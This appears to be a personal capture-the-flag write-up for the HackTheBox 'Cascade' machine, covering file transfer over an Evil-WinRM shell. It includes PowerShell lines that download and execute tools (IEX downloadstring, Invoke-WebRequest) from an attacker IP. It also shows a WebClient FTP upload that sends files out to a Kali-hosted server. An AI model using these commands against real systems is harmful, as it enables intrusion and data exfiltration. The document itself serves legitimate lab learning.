# Transferring files to/from Cascade

## Unable to mount share

After running the impacket-smbserver module I found I couldn't mount the share.

```text
*Evil-WinRM* PS C:\Users\s.smith\Desktop> New-PSDrive -Name X -Root \\10.10.14.78\kali -Credential $Cred -PSProvider FileSystem
A specified logon session does not exist. It may already have been terminated
At line:1 char:1
+ New-PSDrive -Name X -Root \\10.10.14.78\kali -Credential $Cred -PSPro ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (X:PSDriveInfo) [New-PSDrive], Win32Exception
    + FullyQualifiedErrorId : CouldNotMapNetworkDrive,Microsoft.PowerShell.Commands.NewPSDriveCommand

*Evil-WinRM* PS C:\Users\s.smith\Desktop> net use \\10.10.14.78\kali /user:kali kali
net.exe : System error 1312 has occurred.
    + CategoryInfo          : NotSpecified: (System error 1312 has occurred.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError

A specified logon session does not exist. It may already have been terminated.
```

If I dropped the username and password requirement for accessing the share ie. `impacket-smbserver -smb2support kali .` I still couldn't access the share

```shell
*Evil-WinRM* PS C:\Users\s.smith\Desktop> net use X: \\10.10.14.78\kali
net.exe : System error 1240 has occurred.
    + CategoryInfo          : NotSpecified: (System error 1240 has occurred.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError

The account is not authorized to log in from this station.

*Evil-WinRM* PS C:\Users\s.smith\Desktop> net use \\10.10.14.78\kali
net.exe : System error 1240 has occurred.
    + CategoryInfo          : NotSpecified: (System error 1240 has occurred.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError

The account is not authorized to log in from this station.
```

## Download files to target

Consequently I could download winpeas.txt to target only with these two commands

```shell
IEX(New-Object net.WebClient).downloadstring("http://10.10.14.78/winPEASany.exe")
Invoke-WebRequest -Uri "http://10.10.14.78/PowerUp.ps1" -OutFile PowerUp.ps1
```

## Upload files to Kali via FTP powershell

I tried the FTP method to upload files as [per here](https://ivanitlearning.wordpress.com/2020/07/05/rce-pe-experiments-with-server-2019-and-defender/) but it didn't work.

```shell
*Evil-WinRM* PS C:\Users\s.smith\Downloads> ftp.exe -v -n -s:ftp.txt
Connected to 10.10.14.78.
open 10.10.14.78
220 pyftpdlib 1.5.4 ready.
USER anonymous
331 Username ok, send password.

230 Login successful.
binary
200 Type set to: Binary.

PUT winpeas.txt
421 Active data channel timed out.
quit
221 Goodbye.
```

possibly because the Windows FTP client [doesn't support](https://stackoverflow.com/questions/18643542/how-to-use-passive-ftp-mode-in-windows-command-prompt) passive mode. But somehow it worked [with Powershell](https://stackoverflow.com/a/46582183/7908040):

```text
*Evil-WinRM* PS C:\Users\s.smith\Downloads> $client = New-Object System.Net.WebClient
*Evil-WinRM* PS C:\Users\s.smith\Downloads> $client.Credentials = New-Object System.Net.NetworkCredential("anonymous", "password")
*Evil-WinRM* PS C:\Users\s.smith\Downloads> $client.UploadFile("ftp://10.10.14.78/winpeas.txt", "C:\Users\s.smith\Downloads\winpeas.txt")

root@kali:~/CTF/HTB/Cascade/PE# python3 -m pyftpdlib -p 21 -w
/usr/lib/python3/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
  warnings.warn("write permissions assigned to anonymous user.",
[I 2020-12-08 01:17:40] >>> starting FTP server on 0.0.0.0:21, pid=10641 <<<
[I 2020-12-08 01:17:40] concurrency model: async
[I 2020-12-08 01:17:40] masquerade (NAT) address: None
[I 2020-12-08 01:17:40] passive ports: None
[I 2020-12-08 01:18:38] 10.10.10.182:49790-[] FTP session opened (connect)
[I 2020-12-08 01:18:38] 10.10.10.182:49790-[anonymous] USER 'anonymous' logged in.
[I 2020-12-08 01:18:38] 10.10.10.182:49790-[anonymous] STOR /root/CTF/HTB/Cascade/PE/winpeas.txt completed=1 bytes=92284 seconds=0.052
```

Install the FTP server with `apt install python3-pyftpdlib` 